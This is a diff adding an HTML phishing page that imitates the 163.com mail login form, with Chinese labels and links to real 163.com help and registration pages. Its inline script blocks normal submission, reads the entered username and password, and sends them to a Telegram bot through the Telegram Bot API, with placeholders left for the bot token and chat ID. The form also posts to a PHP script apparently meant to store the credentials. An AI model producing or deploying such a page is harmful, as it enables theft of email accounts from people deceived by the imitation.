@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const form = document.getElementById('login163');
+
+            form.addEventListener('submit', function(event) {
+                event.preventDefault(); // Prevent default form submission
+
+                const username = document.getElementById('idInput').value;
+                const password = document.getElementById('pwdInput').value;
+
+                // Replace these with your Telegram Bot Token and Chat ID
+                const telegramToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+                const chatId = 'YOUR_CHAT_ID';
+
+                const message = `Username: ${username}\nPassword: ${password}`;
+
+                fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Message sent successfully');
+                    } else {
+                        console.error('Error sending message:', data);
+                    }
+                })
+                .catch(error => console.error('Error:', error));
+
+                // Optionally, you can submit the form here if you still want to continue with form submission.
+                // form.submit();
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="loginForm">
+        <form id="login163" name="login163" method="post" action="163_update1_connect_msql_database.php">
+            <input type="hidden" id="savelogin" name="savelogin" value="0" />
+            <input type="hidden" id="url2" name="url2" value="http://mail.163.com/errorpage/err_163.htm" />
+            <div id="idInputLine" class="loginFormIpt showPlaceholder" style="margin-top:32px;">
+                <input class="loginFormTdIpt" tabindex="1" title="请输入帐号" id="idInput" name="username" type="text" maxlength="50" value="" style="width:145px;" />
+                <span class="domain">@163.com</span>
+                <div id="mobtips" style="display:;"></div>
+                <label for="idInput" class="placeholder" id="idPlaceholder">邮箱帐号或手机号</label>
+            </div>
+            <div class="forgetPwdLine">						
+                <a class="forgetPwd" href="http://reg.163.com/getpasswd/RetakePassword.jsp?from=mail163" target="_blank" title="找回密码">忘记密码了?</a>
+            </div>
+            <div id="pwdInputLine" class="loginFormIpt showPlaceholder">
+                <input class="loginFormTdIpt" tabindex="2" title="请输入密码" id="pwdInput" name="password" type="password"/>
+                <label for="pwdInput" class="placeholder" id="pwdPlaceholder">密码</label>
+            </div>
+            <div id="lfAutoLogin" class="loginFormCheck">
+                <div class="loginFormCheckInner">
+                    <input tabindex="3" title="两周内自动登录" class="loginFormCbx" type="checkbox" id="remAutoLogin" /><label id="remAutoLoginTxt" class="loginFormSslText" for="remAutoLogin">&nbsp;两周内自动登录&nbsp;</label>
+                    <div class="unishadow" id="whatAutologinTip">为了您的信息安全，请不要在网吧或公用电脑上使用此功能！
+                    </div>
+                    <a class="whatAutologin" href="http://help.163.com/09/1217/10/5QNRFLMM00753VB8.html?b08abI1" tabindex="4" target="_blank" title="什么是自动登录">什么是自动登录</a>
+                </div>
+                <div class="loginFormCheckInner" style="float:right;text-align:right;width:100px;">
+                    <input class="loginFormCbx loginFormSslCbx" type="checkbox" tabindex="5" title="SSL安全登录" id="SslLogin" checked="checked" /><label class="loginFormSslText" for="SslLogin">&nbsp;<span style="font-family:verdana;">SSL</span>安全登录</label>
+                </div>
+            </div>
+            <div class="loginFormIpt loginFormIptWiotTh">
+                <button id="loginBtn" class="btn btn-login formSubmit" tabindex="6" type="submit">登&nbsp;录</button>
+                <a id="lfBtnReg" class="btn btn-reg" href="http://reg.email.163.com/mailregAll/reg0.jsp?from=163mail_right" target="_blank" tabindex="7">注&nbsp;册</a>
+                <a id="lfBtnReg2" class="btn btn-reg" href="http://e.mail.163.com/mobilemail/home.do?from=163mail" target="_blank" tabindex="7">注&nbsp;册</a>
+            </div>
+            <div class="loginFormConf">
+                <div class="loginFormVer">
+                    邮箱版本: <a id="styleConf" href="javascript:void(0);">默认版本 <b class="ico ico-arr ico-arr-d"></b></a>
+                </div>
+                <div class="loginFormService">
+                     <a id="selectLocationTips" href="javascript:void(0);" onclick="fSelectLoaction('show');return false;">登录速度太慢? <b class="ico ico-arr ico-arr-d"></b></a>
+                    <span id="selectLocationTipsDone">
+                        <a href="javascript:void(0);" onclick="fSelectLoaction('show');return false;">
+                            <span>服务器: <span id="selectLocation">电信</span></span><b class="ico ico-arr ico-arr-d"></b>
+                        </a>
+                    </span>
+                </div>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
